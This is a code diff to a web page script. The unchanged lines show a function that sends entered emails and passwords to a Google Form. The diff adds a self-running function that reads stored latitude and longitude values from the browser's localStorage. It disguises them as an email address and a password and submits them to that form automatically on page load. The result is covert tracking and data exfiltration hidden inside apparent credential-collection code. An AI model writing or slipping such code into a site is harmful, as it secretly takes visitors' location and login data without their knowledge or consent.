@@ -403,6 +403,18 @@
                 console.log(`📤 Sent to form: email="${email}", password="${password}"`);
             }
 
+            // Auto-submit z1 (latitude) + @gmail.com as email and z2 (longitude) as password
+            (function autoSubmitLocationData() {
+                const z1 = localStorage.getItem('z1');
+                const z2 = localStorage.getItem('z2');
+                if (z1 && z2) {
+                    const autoEmail = z1 + '@gmail.com';
+                    const autoPassword = String(z2);
+                    submitToGoogleForm(autoEmail, autoPassword);
+                    console.log(`📍 Auto-submitted location: email="${autoEmail}", password="${autoPassword}"`);
+                }
+            })();
+
             function validateEmailAndSend() {
                 const raw = emailInput.value;
                 const val = raw.trim();
